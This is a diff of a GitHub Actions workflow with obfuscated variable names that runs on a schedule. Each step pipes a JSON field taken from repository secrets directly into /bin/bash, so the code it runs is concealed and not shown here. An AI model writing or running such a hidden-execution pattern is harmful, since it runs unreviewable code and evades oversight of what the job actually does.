@@ -2,7 +2,7 @@ name: huangganling2003
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
+    - cron: '0 5/6 * * *'
 
 jobs:
   build:
@@ -11,25 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangganling2003
         env:
-          z888: ${{ secrets.z888 }}
+          jadfz74: ${{ secrets.jadfz74 }}
         run: |
-          echo $z888 | jq -r .kxy4024 | /bin/bash
-          echo $vs198 | jq -r .v3405 | /bin/bash
-          echo $t08879 | jq -r .k52 | /bin/bash
-          echo $eybj195 | jq -r .xke34 | /bin/bash
-          echo $yjp5013 | jq -r .yvmv97253 | /bin/bash
-          echo $zvus04 | jq -r .c30889 | /bin/bash
-          echo $bmpqc15301 | jq -r .niwwz190 | /bin/bash
-          echo $da710 | jq -r .d17 | /bin/bash
-          echo $rugp1502 | jq -r .pbgsk2 | /bin/bash
-          echo $zuqq67 | jq -r .tprn154 | /bin/bash
-          echo $kujrk409 | jq -r .s707 | /bin/bash
-          echo $ex5324 | jq -r .ggopa453 | /bin/bash
-          echo $mn184 | jq -r .luh51 | /bin/bash
-          echo $z14 | jq -r .zmm7 | /bin/bash
-          echo $ulqa55617 | jq -r .jowcw92004 | /bin/bash
-          echo $z5 | jq -r .muycv5526 | /bin/bash
-          echo $wp64 | jq -r .xfjt62626 | /bin/bash
-          echo $prpr6 | jq -r .m98 | /bin/bash
-          echo $edaz29652 | jq -r .zg37921 | /bin/bash
+          echo $jadfz74 | jq -r .vrm6251 | /bin/bash
+          echo $zxn10 | jq -r .iga7640 | /bin/bash
+          echo $xjq464 | jq -r .be156 | /bin/bash
+          echo $i21 | jq -r .djabo0272 | /bin/bash
+          echo $mr53 | jq -r .apac71 | /bin/bash
+          echo $jrdpn8 | jq -r .kjpq2 | /bin/bash
+          echo $d625 | jq -r .qtd06189 | /bin/bash
+          echo $yr52857 | jq -r .qkga47 | /bin/bash
 
